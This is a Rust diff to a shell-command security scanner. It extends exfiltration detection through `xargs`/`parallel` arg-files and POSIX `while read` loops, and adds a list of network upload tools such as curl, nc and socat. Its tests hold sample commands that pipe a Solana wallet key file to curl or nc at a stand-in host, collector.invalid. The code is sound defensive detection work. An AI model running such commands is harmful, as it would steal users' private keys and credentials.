@@ -5913,7 +5913,7 @@ fn sensitive_operand(value: &str) -> bool {
 /// reader with operands synthesized at runtime, so no argv token carries the
 /// sensitive path in a read role and the plain operand scan sees nothing.
 ///
-/// Three bounded forms are modelled:
+/// Five bounded forms are modelled:
 ///
 /// - `xargs <reader>` consuming a static sensitive path list
 ///   (`echo ~/.config/solana/id.json | xargs cat`): the utility's operands
@@ -5926,6 +5926,10 @@ fn sensitive_operand(value: &str) -> bool {
 /// - `parallel <reader> ::: <inputs>`: `:::` promotes the trailing tokens to
 ///   the template's operands, so a sensitive literal there is a direct read
 ///   operand and the answer is Sensitive.
+/// - GNU `xargs -a/--arg-file` and `parallel -a/--arg-file` read the named
+///   file as their runtime argument source. A fixed `echo`/`printf` template
+///   re-emits that input; every other executable remains Incomplete because its
+///   argv/output relationship is not part of the closed proof.
 ///
 /// Anything else returns Clean and the caller keeps its prior answer.
 fn promoted_read_flow(
@@ -5939,10 +5943,469 @@ fn promoted_read_flow(
         return FlowProof::Clean;
     }
     match cmd_base {
-        "xargs" if pipe_connected && pipe_sensitive_path_list => FlowProof::Incomplete,
+        "xargs" => {
+            let arg_file = xargs_arg_file_promotion(args, shell, None);
+            if arg_file.present {
+                arg_file.output
+            } else if pipe_connected && pipe_sensitive_path_list {
+                FlowProof::Incomplete
+            } else {
+                FlowProof::Clean
+            }
+        }
         "find" => find_promoted_read_flow(args, shell),
-        "parallel" => parallel_promoted_read_flow(args, shell),
+        "parallel" => merge_flow_proof(
+            parallel_arg_file_promotion(args, shell, None).output,
+            parallel_promoted_read_flow(args, shell),
+        ),
         _ => FlowProof::Clean,
+    }
+}
+
+fn printf_arg_file_output(input: FlowProof, args: &[String], shell: ShellType) -> FlowProof {
+    let mut index = 0usize;
+    if args
+        .first()
+        .is_some_and(|arg| normalize_shell_token(arg, shell) == "--")
+    {
+        index += 1;
+    }
+    let Some(format) = args.get(index) else {
+        return FlowProof::Clean;
+    };
+    let Ok(format) = evaluated_literal(format, shell) else {
+        return incomplete_if_relevant(input);
+    };
+    let chars = format.chars().collect::<Vec<_>>();
+    let mut offset = 0usize;
+    let mut proof = FlowProof::Clean;
+    while offset < chars.len() {
+        if chars[offset] != '%' {
+            offset += 1;
+            continue;
+        }
+        let Some(conversion) = chars.get(offset + 1).copied() else {
+            return incomplete_if_relevant(input);
+        };
+        if conversion == '%' {
+            offset += 2;
+            continue;
+        }
+        proof = merge_flow_proof(
+            proof,
+            if matches!(conversion, 's' | 'b' | 'q' | 'c') {
+                input
+            } else {
+                // Width/precision/positional syntax and numeric conversions can
+                // consume promoted argv, but their exact disclosure depends on
+                // runtime coercion. Keep that relationship explicitly unknown.
+                incomplete_if_relevant(input)
+            },
+        );
+        offset += 2;
+    }
+    proof
+}
+
+fn promoted_arg_file_output(
+    input: FlowProof,
+    utility: Option<&[String]>,
+    shell: ShellType,
+    staged: Option<&StagedDataflow>,
+) -> FlowProof {
+    let Some(utility) = utility else {
+        // xargs' omitted utility is its fixed `echo` default. GNU parallel also
+        // requires an explicit template, so its caller never passes None.
+        return input;
+    };
+    let raw = utility.join(" ");
+    let segments = tokenize::tokenize(&raw, shell);
+    let Some(segment) = segments.first().filter(|_| segments.len() == 1) else {
+        return incomplete_if_relevant(input);
+    };
+    let Ok(mut effective) = resolve_effective_segment(segment, shell) else {
+        return incomplete_if_relevant(input);
+    };
+    let Some(command) = effective.command.as_deref() else {
+        return incomplete_if_relevant(input);
+    };
+    let command = normalize_cmd_base(command, shell);
+    let Ok(args) = dataflow_segment_args(&effective, shell) else {
+        return incomplete_if_relevant(input);
+    };
+    effective.args = args;
+    let mut fixed_output = read_command_provenance(&command, &effective.args, shell);
+    if is_shell_dataflow_reader(&command, shell) {
+        for raw in &effective.args {
+            fixed_output = merge_flow_proof(
+                fixed_output,
+                staged.map_or(FlowProof::Clean, |staged| {
+                    staged_flow_for_path(staged, raw, shell)
+                }),
+            );
+        }
+    }
+    if nested_output_preserving_command(&command) {
+        for raw in &effective.args {
+            let parsed = parse_dataflow_word(raw, shell);
+            if parsed.sensitive_env_expansion || !parsed.substitutions.is_empty() {
+                fixed_output = merge_flow_proof(
+                    fixed_output,
+                    match resolve_parsed_word(&parsed, 0) {
+                        EvaluatedWord::Sensitive => FlowProof::Sensitive,
+                        EvaluatedWord::Incomplete => FlowProof::Incomplete,
+                        EvaluatedWord::Literal(_) => FlowProof::Clean,
+                    },
+                );
+            }
+        }
+    }
+    let promoted_output = match command.as_str() {
+        "echo" => input,
+        "printf" => printf_arg_file_output(input, &effective.args, shell),
+        ":" | "true" | "false" | "test" | "[" => FlowProof::Clean,
+        _ => incomplete_if_relevant(input),
+    };
+    merge_flow_proof(fixed_output, promoted_output)
+}
+
+fn arg_file_operand_flow(
+    raw: &str,
+    shell: ShellType,
+    staged: Option<&StagedDataflow>,
+) -> FlowProof {
+    merge_flow_proof(
+        promoted_operand_flow(raw, shell),
+        staged.map_or(FlowProof::Clean, |staged| {
+            staged_flow_for_path(staged, raw, shell)
+        }),
+    )
+}
+
+#[derive(Debug, Clone, Copy)]
+struct ArgFilePromotion {
+    present: bool,
+    output: FlowProof,
+}
+
+impl ArgFilePromotion {
+    fn absent() -> Self {
+        Self {
+            present: false,
+            output: FlowProof::Clean,
+        }
+    }
+
+    fn present(output: FlowProof) -> Self {
+        Self {
+            present: true,
+            output,
+        }
+    }
+}
+
+fn explicit_arg_file_candidate(
+    args: &[String],
+    end: usize,
+    shell: ShellType,
+    boolean_short_options: &[char],
+    staged: Option<&StagedDataflow>,
+) -> FlowProof {
+    let mut flow = FlowProof::Clean;
+    let mut index = 0usize;
+    while index < end {
+        let token = normalize_shell_token(&args[index], shell);
+        if token == "--" {
+            break;
+        }
+        if token.starts_with("--") {
+            let (name, attached) = split_attached_option(&token, '=');
+            if matches!(name, "--arg-file" | "--argfile") {
+                let value = attached
+                    .filter(|value| !value.is_empty())
+                    .or_else(|| args.get(index + 1).map(String::as_str));
+                if let Some(value) = value {
+                    flow = merge_flow_proof(flow, arg_file_operand_flow(value, shell, staged));
+                } else {
+                    flow = merge_flow_proof(flow, FlowProof::Incomplete);
+                }
+            }
+            index += 1;
+            continue;
+        }
+        if let Some(flags) = token.strip_prefix('-').filter(|flags| !flags.is_empty()) {
+            for (offset, option) in flags.char_indices() {
+                if option == 'a'
+                    && flags[..offset]
+                        .chars()
+                        .all(|prior| boolean_short_options.contains(&prior))
+                {
+                    let attached = &flags[offset + option.len_utf8()..];
+                    let value = (!attached.is_empty())
+                        .then_some(attached)
+                        .or_else(|| args.get(index + 1).map(String::as_str));
+                    if let Some(value) = value {
+                        flow = merge_flow_proof(flow, arg_file_operand_flow(value, shell, staged));
+                    } else {
+                        flow = merge_flow_proof(flow, FlowProof::Incomplete);
+                    }
+                    break;
+                }
+            }
+        }
+        index += 1;
+    }
+    flow
+}
+
+fn failed_arg_file_parse(present: bool, input: FlowProof, fallback: FlowProof) -> ArgFilePromotion {
+    if present {
+        ArgFilePromotion::present(incomplete_if_relevant(input))
+    } else if fallback != FlowProof::Clean {
+        ArgFilePromotion::present(incomplete_if_relevant(fallback))
+    } else {
+        ArgFilePromotion::absent()
+    }
+}
+
+/// Parse the option prefix accepted by GNU/BSD xargs. The executable scanner
+/// has a parallel grammar; keeping this local avoids turning executable-body
+/// extraction into a dataflow API while retaining the same bounded option set.
+fn xargs_arg_file_promotion(
+    args: &[String],
+    shell: ShellType,
+    staged: Option<&StagedDataflow>,
+) -> ArgFilePromotion {
+    let mut index = 0usize;
+    let mut input = FlowProof::Clean;
+    let mut present = false;
+    let fallback = explicit_arg_file_candidate(
+        args,
+        args.len(),
+        shell,
+        &['0', 'o', 'p', 'r', 't', 'x'],
+        staged,
+    );
+    while index < args.len() {
+        let option = normalize_shell_token(&args[index], shell);
+        if option == "--" {
+            index += 1;
+            break;
+        }
+        if !option.starts_with('-') || option == "-" {
+            break;
+        }
+        if option.starts_with("--") {
+            let (name, attached) = split_attached_option(&option, '=');
+            if matches!(
+                name,
+                "--null"
+                    | "--open-tty"
+                    | "--interactive"
+                    | "--no-run-if-empty"
+                    | "--verbose"
+                    | "--exit"
+                    | "--show-limits"
+                    | "--help"
+                    | "--version"
+            ) {
+                if attached.is_some() {
+                    return failed_arg_file_parse(present, input, fallback);
+                }
+                index += 1;
+                continue;
+            }
+            if matches!(
+                name,
+                "--arg-file"
+                    | "--delimiter"
+                    | "--eof"
+                    | "--replace"
+                    | "--max-lines"
+                    | "--max-args"
+                    | "--max-procs"
+                    | "--max-chars"
+                    | "--process-slot-var"
+            ) {
+                let (value, advance) = match attached {
+                    Some(value) if !value.is_empty() => (value, 1),
+                    Some(_) => {
+                        return failed_arg_file_parse(present, input, fallback);
+                    }
+                    None => match args.get(index + 1) {
+                        Some(value) => (value.as_str(), 2),
+                        None => {
+                            return failed_arg_file_parse(present, input, fallback);
+                        }
+                    },
+                };
+                if name == "--arg-file" {
+                    present = true;
+                    input = merge_flow_proof(input, arg_file_operand_flow(value, shell, staged));
+                }
+                index += advance;
+                continue;
+            }
+            return failed_arg_file_parse(present, input, fallback);
+        }
+
+        let flags = &option[1..];
+        let mut advance = 1usize;
+        let mut valid = true;
+        for (offset, flag) in flags.char_indices() {
+            if matches!(flag, '0' | 'o' | 'p' | 'r' | 't' | 'x') {
+                continue;
+            }
+            if matches!(flag, 'e' | 'i' | 'l') {
+                break;
+            }
+            if matches!(
+                flag,
+                'a' | 'd' | 'E' | 'I' | 'L' | 'n' | 'P' | 's' | 'J' | 'R' | 'S'
+            ) {
+                let attached = &flags[offset + flag.len_utf8()..];
+                let value = if attached.is_empty() {
+                    advance = 2;
+                    args.get(index + 1).map(String::as_str)
+                } else {
+                    Some(attached)
+                };
+                let Some(value) = value else {
+                    valid = false;
+                    break;
+                };
+                if flag == 'a' {
+                    present = true;
+                    input = merge_flow_proof(input, arg_file_operand_flow(value, shell, staged));
+                }
+                break;
+            }
+            valid = false;
+            break;
+        }
+        if !valid {
+            return failed_arg_file_parse(present, input, fallback);
+        }
+        index += advance;
+    }
+
+    if present {
+        ArgFilePromotion::present(promoted_arg_file_output(
+            input,
+            args.get(index..).filter(|body| !body.is_empty()),
+            shell,
+            staged,
+        ))
+    } else {
+        ArgFilePromotion::absent()
+    }
+}
+
+fn parallel_arg_file_promotion(
+    args: &[String],
+    shell: ShellType,
+    staged: Option<&StagedDataflow>,
+) -> ArgFilePromotion {
+    let separator = args.iter().position(|arg| {
+        matches!(
+            normalize_shell_token(arg, shell).as_str(),
+            ":::" | ":::+" | "::::" | "::::+"
+        )
+    });
+    let template_end = separator.unwrap_or(args.len());
+    let mut input = FlowProof::Clean;
+    let mut present = false;
+    let fallback =
+        explicit_arg_file_candidate(args, template_end, shell, &['0', 'k', 'm', 'v'], staged);
+    let mut index = 0usize;
+    let mut options = true;
+    while index < template_end {
+        let token = normalize_shell_token(&args[index], shell);
+        if options && token == "--" {
+            options = false;
+            index += 1;
+            continue;
+        }
+        if options && token.starts_with("--") {
+            let (name, attached) = split_attached_option(&token, '=');
+            if matches!(name, "--arg-file" | "--argfile") {
+                let (value, advance) = match attached {
+                    Some(value) if !value.is_empty() => (value, 1),
+                    Some(_) => {
+                        return failed_arg_file_parse(present, input, fallback);
+                    }
+                    None => match args.get(index + 1).filter(|_| index + 1 < template_end) {
+                        Some(value) => (value.as_str(), 2),
+                        None => {
+                            return failed_arg_file_parse(present, input, fallback);
+                        }
+                    },
+                };
+                present = true;
+                input = merge_flow_proof(input, arg_file_operand_flow(value, shell, staged));
+                index += advance;
+                continue;
+            }
+        }
+        if options && token.starts_with('-') && !token.starts_with("--") && token != "-" {
+            let flags = &token[1..];
+            let mut value_option = None;
+            for (offset, option) in flags.char_indices() {
+                if matches!(option, 'a' | 'j' | 'P' | 'S' | 'L' | 'N' | 'n' | 's') {
+                    value_option = Some((option, offset + option.len_utf8()));
+                    break;
+                }
+                if !matches!(option, '0' | 'k' | 'm' | 'v') {
+                    break;
+                }
+            }
+            if let Some(('a', value_start)) = value_option {
+                let attached = &flags[value_start..];
+                let (value, advance) = if attached.is_empty() {
+                    match args.get(index + 1).filter(|_| index + 1 < template_end) {
+                        Some(value) => (value.as_str(), 2),
+                        None => {
+                            return failed_arg_file_parse(present, input, fallback);
+                        }
+                    }
+                } else {
+                    (attached, 1)
+                };
+                present = true;
+                input = merge_flow_proof(input, arg_file_operand_flow(value, shell, staged));
+                index += advance;
+                continue;
+            }
+        }
+        if options {
+            match parallel_option_advance(args, index, shell) {
+                Ok(Some(advance)) => {
+                    index += advance;
+                    continue;
+                }
+                Ok(None) => {}
+                Err(()) => {
+                    return failed_arg_file_parse(present, input, fallback);
+                }
+            }
+        }
+        break;
+    }
+
+    if !present {
+        return ArgFilePromotion::absent();
+    }
+    match args
+        .get(index..template_end)
+        .filter(|body| !body.is_empty())
+    {
+        Some(utility) => ArgFilePromotion::present(promoted_arg_file_output(
+            input,
+            Some(utility),
+            shell,
+            staged,
+        )),
+        None => ArgFilePromotion::present(incomplete_if_relevant(input)),
     }
 }
 
@@ -6434,6 +6897,375 @@ fn static_sensitive_path_list_output(command: &str, args: &[String]) -> bool {
         EvaluatedSubstitution::Sensitive => true,
         EvaluatedSubstitution::Incomplete => false,
     }
+}
+
+#[derive(Debug)]
+struct PosixWhileReadFlow {
+    variables: Vec<String>,
+    input: FlowProof,
+    stdout: FlowProof,
+    in_body: bool,
+    supported: bool,
+}
+
+#[derive(Debug)]
+enum PosixLoopFrame {
+    WhileRead(PosixWhileReadFlow),
+    Other { in_body: bool },
+}
+
+impl PosixLoopFrame {
+    fn enter_body(&mut self) {
+        match self {
+            Self::WhileRead(state) => state.in_body = true,
+            Self::Other { in_body } => *in_body = true,
+        }
+    }
+}
+
+#[derive(Debug, Clone, Copy)]
+struct PosixWhileBodyFlow {
+    stdout_override: Option<FlowProof>,
+    remote_reference: bool,
+}
+
+fn posix_identifier(value: &str) -> bool {
+    let mut chars = value.chars();
+    chars
+        .next()
+        .is_some_and(|first| first == '_' || first.is_ascii_alphabetic())
+        && chars.all(|character| character == '_' || character.is_ascii_alphanumeric())
+}
+
+/// Recover the variables bound by the closed POSIX `while ... read ...` form.
+/// Other loop conditions retain the generic control-flow treatment.
+fn posix_while_read_variables(command: &str, args: &[String]) -> Result<Option<Vec<String>>, ()> {
+    if command != "while" {
+        return Ok(None);
+    }
+    let structural = args
+        .iter()
+        .map(|arg| normalize_shell_token(arg, ShellType::Posix))
+        .collect::<Vec<_>>();
+    let Some(read_index) = structural.iter().position(|arg| arg == "read") else {
+        return Ok(None);
+    };
+    if structural[..read_index]
+        .iter()
+        .any(|arg| !tokenize::is_env_assignment(arg))
+    {
+        return Err(());
+    }
+
+    let mut index = read_index + 1;
+    let mut options = true;
+    while options && index < structural.len() {
+        match structural[index].as_str() {
+            "--" => {
+                options = false;
+                index += 1;
+            }
+            "-r" => index += 1,
+            // Common shell extensions with one option operand. Supporting them
+            // is safe because only the following static variable names become
+            // bindings; an unsupported option fails the closed proof.
+            "-d" | "-n" | "-N" | "-p" | "-t" | "-u" => {
+                if index + 1 >= structural.len() {
+                    return Err(());
+                }
+                index += 2;
+            }
+            option if option.starts_with('-') => return Err(()),
+            _ => options = false,
+        }
+    }
+    let variables = structural[index..]
+        .iter()
+        .take_while(|word| posix_identifier(word))
+        .cloned()
+        .collect::<Vec<_>>();
+    if variables.is_empty() || index + variables.len() != structural.len() {
+        return Err(());
+    }
+    Ok(Some(variables))
+}
+
+fn posix_word_references_variable(raw: &str, variables: &[String]) -> Result<bool, ()> {
+    if raw.len() > MAX_SHELL_DATAFLOW_WORD_BYTES {
+        return Err(());
+    }
+    let chars = raw.chars().collect::<Vec<_>>();
+    let mut quote = None;
+    let mut escaped = false;
+    let mut index = 0usize;
+    while index < chars.len() {
+        let character = chars[index];
+        if escaped {
+            escaped = false;
+            index += 1;
+            continue;
+        }
+        if character == '\\' && quote != Some('\'') {
+            escaped = true;
+            index += 1;
+            continue;
+        }
+        if character == '\'' && quote != Some('"') {
+            quote = if quote == Some('\'') {
+                None
+            } else {
+                Some('\'')
+            };
+            index += 1;
+            continue;
+        }
+        if character == '"' && quote != Some('\'') {
+            quote = if quote == Some('"') { None } else { Some('"') };
+            index += 1;
+            continue;
+        }
+        if character == '$' && quote != Some('\'') {
+            if chars.get(index + 1) == Some(&'{') {
+                let Some(close_offset) = chars[index + 2..]
+                    .iter()
+                    .position(|candidate| *candidate == '}')
+                else {
+                    return Err(());
+                };
+                let end = index + 2 + close_offset;
+                let name = chars[index + 2..end].iter().collect::<String>();
+                match posix_word_references_variable(&name, variables) {
+                    Ok(true) => return Ok(true),
+                    Err(()) => return Err(()),
+                    Ok(false) => {}
+                }
+                if name.strip_prefix('#').is_some_and(|length_operand| {
+                    variables.iter().any(|variable| {
+                        length_operand == variable
+                            || length_operand
+                                .strip_prefix(variable)
+                                .is_some_and(|suffix| suffix.starts_with('['))
+                    })
+                }) {
+                    return Ok(true);
+                }
+                for variable in variables {
+                    let Some(suffix) = name.strip_prefix(variable) else {
+                        continue;
+                    };
+                    if suffix.is_empty() {
+                        return Ok(true);
+                    }
+                    let Some(operator) = suffix.chars().next() else {
+                        return Ok(true);
+                    };
+                    if operator.is_ascii_alphanumeric() || operator == '_' {
+                        // `${lineage}` is not a reference to a bound `line`.
+                        continue;
+                    }
+                    let derived = match operator {
+                        // `${v+word}` / `${v:+word}` select the alternate word
+                        // precisely when read bound v. A constant alternate does
+                        // not disclose v, so keep this conditional form unknown.
+                        '+' => false,
+                        ':' if suffix.starts_with(":+") => false,
+                        // Bash's quoted-value transformation is reviewed. Other
+                        // `@` operators include attribute-only forms, so they do
+                        // not share its proof.
+                        '@' => suffix == "@Q",
+                        ':' | '-' | '=' | '?' | '%' | '#' | '/' | '^' | ',' | '[' => true,
+                        _ => false,
+                    };
+                    if derived {
+                        // Default/substring/case/quote/index transforms all
+                        // derive their result from the bound value (possibly
+                        // selecting a fallback when it is empty).
+                        return Ok(true);
+                    }
+                    // A braced form rooted at the bound name but outside the
+                    // reviewed grammar must retain uncertainty, never Clean.
+                    return Err(());
+                }
+                if name
+                    .strip_prefix('!')
+                    .is_some_and(|indirect| variables.iter().any(|variable| variable == indirect))
+                {
+                    return Err(());
+                }
+                index = end + 1;
+                continue;
+            }
+            let mut end = index + 1;
+            while chars
+                .get(end)
+                .is_some_and(|candidate| candidate.is_ascii_alphanumeric() || *candidate == '_')
+            {
+                end += 1;
+            }
+            if end > index + 1 {
+                let name = chars[index + 1..end].iter().collect::<String>();
+                if variables.iter().any(|variable| variable == &name) {
+                    return Ok(true);
+                }
+                index = end;
+                continue;
+            }
+        }
+        index += 1;
+    }
+    if escaped || quote.is_some() {
+        Err(())
+    } else {
+        Ok(false)
+    }
+}
+
+fn posix_while_body_flow(
+    args: &[String],
+    variables: &[String],
+    input: FlowProof,
+) -> PosixWhileBodyFlow {
+    let raw = args.join(" ");
+    let segments = tokenize::tokenize(&raw, ShellType::Posix);
+    let Some(segment) = segments.first().filter(|_| segments.len() == 1) else {
+        return PosixWhileBodyFlow {
+            stdout_override: Some(incomplete_if_relevant(input)),
+            remote_reference: input != FlowProof::Clean,
+        };
+    };
+    let Ok(mut effective) = resolve_effective_segment(segment, ShellType::Posix) else {
+        return PosixWhileBodyFlow {
+            stdout_override: Some(incomplete_if_relevant(input)),
+            remote_reference: input != FlowProof::Clean,
+        };
+    };
+    let Some(command) = effective.command.as_deref() else {
+        return PosixWhileBodyFlow {
+            stdout_override: Some(incomplete_if_relevant(input)),
+            remote_reference: input != FlowProof::Clean,
+        };
+    };
+    let command = normalize_cmd_base(command, ShellType::Posix);
+    let Ok(body_args) = dataflow_segment_args(&effective, ShellType::Posix) else {
+        return PosixWhileBodyFlow {
+            stdout_override: Some(incomplete_if_relevant(input)),
+            remote_reference: input != FlowProof::Clean,
+        };
+    };
+    effective.args = body_args;
+    let mut independent_output =
+        read_command_provenance(&command, &effective.args, ShellType::Posix);
+    if nested_output_preserving_command(&command) {
+        for raw in &effective.args {
+            let parsed = parse_dataflow_word(raw, ShellType::Posix);
+            if parsed.sensitive_env_expansion || !parsed.substitutions.is_empty() {
+                independent_output = merge_flow_proof(
+                    independent_output,
+                    match resolve_parsed_word(&parsed, 0) {
+                        EvaluatedWord::Sensitive => FlowProof::Sensitive,
+                        EvaluatedWord::Incomplete => FlowProof::Incomplete,
+                        EvaluatedWord::Literal(_) => FlowProof::Clean,
+                    },
+                );
+            }
+        }
+    }
+    let mut references_input = false;
+    for arg in &effective.args {
+        match posix_word_references_variable(arg, variables) {
+            Ok(found) => references_input |= found,
+            Err(()) => {
+                return PosixWhileBodyFlow {
+                    stdout_override: Some(incomplete_if_relevant(input)),
+                    remote_reference: input != FlowProof::Clean,
+                };
+            }
+        }
+    }
+    if references_input {
+        let remote_reference = matches!(
+            command.as_str(),
+            "curl"
+                | "wget"
+                | "http"
+                | "https"
+                | "xh"
+                | "nc"
+                | "ncat"
+                | "netcat"
+                | "socat"
+                | "scp"
+                | "rsync"
+                | "rclone"
+                | "dig"
+                | "nslookup"
+        ) && input != FlowProof::Clean;
+        let loop_output = match command.as_str() {
+            "echo" => Some(input),
+            "printf" => Some(printf_arg_file_output(
+                input,
+                &effective.args,
+                ShellType::Posix,
+            )),
+            ":" | "true" | "false" | "test" | "[" => Some(FlowProof::Clean),
+            _ if remote_reference => Some(FlowProof::Clean),
+            _ => Some(incomplete_if_relevant(input)),
+        };
+        let stdout_override = loop_output
+            .map(|flow| merge_flow_proof(independent_output, flow))
+            .or((independent_output != FlowProof::Clean).then_some(independent_output));
+        return PosixWhileBodyFlow {
+            stdout_override,
+            remote_reference,
+        };
+    }
+
+    let stdout_override = match command.as_str() {
+        ":" | "true" | "false" | "test" | "[" | "echo" | "printf" => Some(independent_output),
+        _ if independent_output != FlowProof::Clean => Some(independent_output),
+        _ => None,
+    };
+    PosixWhileBodyFlow {
+        stdout_override,
+        remote_reference: false,
+    }
+}
+
+fn posix_control_prefix_opens_loop(args: &[String]) -> bool {
+    if args.is_empty() {
+        return false;
+    }
+    promoted_utility_base(args, ShellType::Posix)
+        .is_ok_and(|command| matches!(command.as_str(), "while" | "until" | "for" | "select"))
+}
+
+fn posix_while_compound_stdin(
+    segments: &[tokenize::Segment],
+    opener: usize,
+    shell: ShellType,
+) -> FlowProof {
+    let mut depth = 0usize;
+    for (index, segment) in segments.iter().enumerate().skip(opener) {
+        let command = segment
+            .command
+            .as_deref()
+            .map(|command| normalize_cmd_base(command, shell));
+        match command.as_deref() {
+            Some("while" | "until" | "for" | "select") => depth += 1,
+            Some("do") if posix_control_prefix_opens_loop(&segment.args) => depth += 1,
+            Some("done") => {
+                depth = depth.saturating_sub(1);
+                if depth == 0 {
+                    let outgoing = segments
+                        .get(index + 1)
+                        .and_then(|next| next.preceding_separator.as_deref());
+                    return ordered_fd_routing(segment, shell, FlowProof::Clean, outgoing).stdin;
+                }
+            }
+            _ => {}
+        }
+    }
+    FlowProof::Clean
 }
 
 fn reviewed_dynamic_sensitive_path(parsed: &ParsedShellWord) -> bool {
@@ -10048,6 +10880,7 @@ fn check_data_exfiltration_depth(
     let mut pipeline_stderr = FlowProof::Clean;
     let mut previous_entry: Option<StagedDataflow> = None;
     let mut previous_outcome = StaticCommandOutcome::Unknown;
+    let mut posix_loop_frames = Vec::<PosixLoopFrame>::new();
     for (segment_index, seg) in segments.iter().enumerate() {
         let separator = seg.preceding_separator.as_deref();
         let statically_skipped = matches!(
@@ -10222,6 +11055,115 @@ fn check_data_exfiltration_depth(
             }
         };
         effective.args = effective_args;
+        let arg_file_output_override = match cmd_base.as_str() {
+            "xargs" => {
+                let promotion = xargs_arg_file_promotion(&effective.args, shell, Some(staged));
+                promotion.present.then_some(promotion.output)
+            }
+            "parallel" => {
+                let promotion = parallel_arg_file_promotion(&effective.args, shell, Some(staged));
+                if promotion.present {
+                    Some(merge_flow_proof(
+                        promotion.output,
+                        parallel_promoted_read_flow(&effective.args, shell),
+                    ))
+                } else {
+                    None
+                }
+            }
+            _ => None,
+        };
+        let mut opened_while_read = false;
+        if shell == ShellType::Posix {
+            let loop_input = || {
+                merge_flow_proof(
+                    routing.stdin,
+                    posix_while_compound_stdin(segments, segment_index, shell),
+                )
+            };
+            match cmd_base.as_str() {
+                "while" => match posix_while_read_variables(&cmd_base, &effective.args) {
+                    Ok(Some(variables)) => {
+                        posix_loop_frames.push(PosixLoopFrame::WhileRead(PosixWhileReadFlow {
+                            variables,
+                            input: loop_input(),
+                            stdout: FlowProof::Clean,
+                            in_body: false,
+                            supported: true,
+                        }));
+                        opened_while_read = true;
+                    }
+                    Err(()) => {
+                        let input = loop_input();
+                        posix_loop_frames.push(PosixLoopFrame::WhileRead(PosixWhileReadFlow {
+                            variables: Vec::new(),
+                            input,
+                            stdout: incomplete_if_relevant(input),
+                            in_body: false,
+                            supported: false,
+                        }));
+                        opened_while_read = true;
+                    }
+                    Ok(None) => posix_loop_frames.push(PosixLoopFrame::Other { in_body: false }),
+                },
+                "until" | "for" | "select" => {
+                    posix_loop_frames.push(PosixLoopFrame::Other { in_body: false });
+                }
+                _ => {}
+            }
+        }
+        let mut closed_while_output = None;
+        if shell == ShellType::Posix && cmd_base == "done" {
+            closed_while_output = posix_loop_frames.pop().and_then(|frame| match frame {
+                PosixLoopFrame::WhileRead(state) => Some(state.stdout),
+                PosixLoopFrame::Other { .. } => None,
+            });
+        }
+        let mut while_body_flow: Option<PosixWhileBodyFlow> = None;
+        if shell == ShellType::Posix && !opened_while_read && cmd_base != "done" {
+            let nested_control_loop =
+                cmd_base == "do" && posix_control_prefix_opens_loop(&effective.args);
+            let body_tokens = if cmd_base == "do" {
+                if let Some(frame) = posix_loop_frames.last_mut() {
+                    frame.enter_body();
+                }
+                effective.args.clone()
+            } else {
+                let mut body = Vec::with_capacity(effective.args.len() + 1);
+                if let Some(command) = effective.command.clone() {
+                    body.push(command);
+                }
+                body.extend(effective.args.clone());
+                body
+            };
+            if !body_tokens.is_empty() {
+                for state in posix_loop_frames.iter().filter_map(|frame| match frame {
+                    PosixLoopFrame::WhileRead(state) if state.in_body && state.supported => {
+                        Some(state)
+                    }
+                    PosixLoopFrame::WhileRead(_) | PosixLoopFrame::Other { .. } => None,
+                }) {
+                    let body = posix_while_body_flow(&body_tokens, &state.variables, state.input);
+                    while_body_flow =
+                        Some(while_body_flow.map_or(body, |current| PosixWhileBodyFlow {
+                            stdout_override: match (current.stdout_override, body.stdout_override) {
+                                (Some(left), Some(right)) => Some(merge_flow_proof(left, right)),
+                                (Some(flow), None) | (None, Some(flow)) => Some(flow),
+                                (None, None) => None,
+                            },
+                            remote_reference: current.remote_reference || body.remote_reference,
+                        }));
+                }
+            }
+            if nested_control_loop {
+                // POSIX tokenization keeps a command immediately after `do` in
+                // the same segment (`do for ...`, `do while ...`). Its matching
+                // `done` must close a typed inner frame, not the surrounding
+                // while-read frame. The inner frame enters its body only when
+                // the following `do` segment is processed.
+                posix_loop_frames.push(PosixLoopFrame::Other { in_body: false });
+            }
+        }
         let emits_sensitive_path_list = matches!(shell, ShellType::Posix | ShellType::Fish)
             && static_sensitive_path_list_output(&cmd_base, &effective.args);
         let (occurrences, nested_gap) =
@@ -10342,6 +11284,24 @@ fn check_data_exfiltration_depth(
             for raw in &effective.args {
                 current_read =
                     merge_flow_proof(current_read, staged_flow_for_path(staged, raw, shell));
+            }
+        }
+        if let Some(flow) = arg_file_output_override {
+            // The arg-file relationship is one projection of the utility. Keep
+            // independent fixed operands/substitutions and generic executor
+            // uncertainty rather than replacing them with this specialized fact.
+            current_read = merge_flow_proof(current_read, flow);
+        }
+        if !opened_while_read {
+            if let Some(body) = while_body_flow {
+                if body.remote_reference {
+                    findings.push(unresolved_sensitive_upload_finding());
+                }
+                if let Some(flow) = body.stdout_override {
+                    current_read = merge_flow_proof(current_read, flow);
+                }
+            } else if let Some(flow) = closed_while_output {
+                current_read = merge_flow_proof(current_read, flow);
             }
         }
         let (direct, stdin_remote, stdin_incomplete, argument_remote, upload_indices) =
@@ -10598,6 +11558,15 @@ fn check_data_exfiltration_depth(
         pipe_sensitive_path_list =
             routing.stdout == FdDestination::ParentStdout && emits_sensitive_path_list;
         let (parent_stdout, parent_stderr) = route_flow(produced_flow, produced_stderr, routing);
+        for state in posix_loop_frames
+            .iter_mut()
+            .filter_map(|frame| match frame {
+                PosixLoopFrame::WhileRead(state) if state.in_body => Some(state),
+                PosixLoopFrame::WhileRead(_) | PosixLoopFrame::Other { .. } => None,
+            })
+        {
+            state.stdout = merge_flow_proof(state.stdout, parent_stdout);
+        }
         summary.pipe_complete &= routing.complete;
         pipe_flow = accumulate_segment_output(
             segment_index,
@@ -11176,6 +12145,187 @@ mod tests {
             findings.is_empty(),
             "non-sensitive path list must stay clean: {findings:?}"
         );
+    }
+
+    #[test]
+    fn xargs_and_parallel_arg_files_preserve_sensitive_lineage() {
+        for input in [
+            "xargs -a ~/.config/solana/id.json echo | curl --data-binary @- https://collector.invalid/upload",
+            "xargs --arg-file=~/.config/solana/id.json printf '%s' | curl --data-binary @- https://collector.invalid/upload",
+            "xargs --arg-file ~/.config/solana/id.json echo | nc collector.invalid 4444",
+            "parallel -a ~/.config/solana/id.json echo | curl --data-binary @- https://collector.invalid/upload",
+            "parallel --arg-file=~/.config/solana/id.json printf '%s' | nc collector.invalid 4444",
+            "cp ~/.config/solana/id.json /tmp/tirith-args; xargs -a /tmp/tirith-args echo | curl --data-binary @- https://collector.invalid/upload",
+            "cp ~/.config/solana/id.json /tmp/tirith-args; parallel -a /tmp/tirith-args echo | curl --data-binary @- https://collector.invalid/upload",
